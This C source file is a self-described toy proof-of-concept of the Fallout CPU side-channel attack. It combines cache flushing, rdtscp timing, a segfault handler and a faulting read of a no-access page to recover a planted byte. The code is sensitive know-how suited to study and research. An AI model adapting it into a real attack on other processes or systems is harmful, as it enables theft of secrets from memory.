#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h> // mmap()
#include <fcntl.h> // open()
#include <unistd.h> // close() 
#include <setjmp.h> // save context on seg fault
#include <signal.h> // signal handler for seg fault
#include <emmintrin.h> // _mm_clfush()
#include <x86intrin.h>

#define PAGE_SIZE 4096
#define CACHE_HIT_THRESHOLD 100
#define DELTA 1024 // to reduce the bias toward 0

static sigjmp_buf jbuf;
uint8_t probe_array[256 * PAGE_SIZE];
static int scores[256];

// signal handler on a segmentation fault
static void catch_segv() {
    siglongjmp(jbuf, 1); // return to the checkpoint when sigsetjump() was called ; restores context
}

void probe() {
    unsigned int junk = 0; 
    register uint64_t start, total_cycles;
    volatile uint8_t* addr; // 8-bit pointer = byte pointer

    int i;
    for(i=0; i<256; i++) {
        addr = &probe_array[i * PAGE_SIZE + DELTA]; 
        start = __rdtscp(&junk); // read time stamp before the memory read
        junk = *addr; // read value
        total_cycles = __rdtscp(&junk) - start; 
        printf("%3i: %lu cycles\n", i, total_cycles);
        if(total_cycles < CACHE_HIT_THRESHOLD) scores[i]++; 
    }
}

int main() {
    
    printf("Toy example of Fallout attack\n");
   
    int fd_v = open("victim.out", O_RDWR | O_CREAT | O_TRUNC, 0600); 
    int fd_a = open("attacker.out", O_RDWR | O_CREAT | O_TRUNC, 0600); 

    if(fd_v == -1 || fd_a == -1) {
        perror("Failed to open victim.out and attacker.out\n");
        return 1;
    }
    
    // create pages
    char* victim_page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd_v, 0);
    char* attacker_page = mmap(NULL, PAGE_SIZE, PROT_NONE, MAP_SHARED, fd_a, 0);

    if(!victim_page || !attacker_page) {
        printf("mmap() failed.\n");
        return 1;
    }

    // extend page size
    lseek(fd_v, PAGE_SIZE, SEEK_SET);
    write(fd_v, "A", 1);
    
    lseek(fd_a, PAGE_SIZE, SEEK_SET);
    write(fd_a, "A", 1);

    printf("Victim page mapped to %p\n", victim_page);
    printf("Attacker page mapped to %p\n", attacker_page);

    // set signal handler for segmentation fault
    signal(SIGSEGV, catch_segv);
  
    // arbitrary values 
    int offset = 7; 
    unsigned char secret = 0x99;    
    char b;
   
    // initialize the probe_array
    for(int i=0; i<256; i++) { 
        probe_array[i * PAGE_SIZE + DELTA] = 1; 
    }
    
    // flush probe_array from CPU cache
    for(int i=0; i<256; i++) {
        _mm_clflush(&probe_array[i * PAGE_SIZE + DELTA]);
    }
 
    // access victim page
    victim_page[offset] = secret; // the value we want to obtain after probe()

    // save context prior to segmentation fault 
    if(sigsetjmp(jbuf, 1) == 0) {  // return 0 if checkpoint was set up ; returns non-zero if returning from siglongjump()
        // access attacker page 
        b = probe_array[attacker_page[offset] * PAGE_SIZE + DELTA]; 
    } 
    probe(); // flush + reload to extract victim value

    int max = 0;
    unsigned char guess = 0;
    for(int i=0; i<256; i++) {
        if(scores[i] > max) {
            guess = i;
            max = scores[i];
        }
    }
    printf("Guess: %02x ; Actual: %02x\n", guess, secret);  
  
    munmap(victim_page, PAGE_SIZE);
    munmap(attacker_page, PAGE_SIZE);
    
    return 0;
}
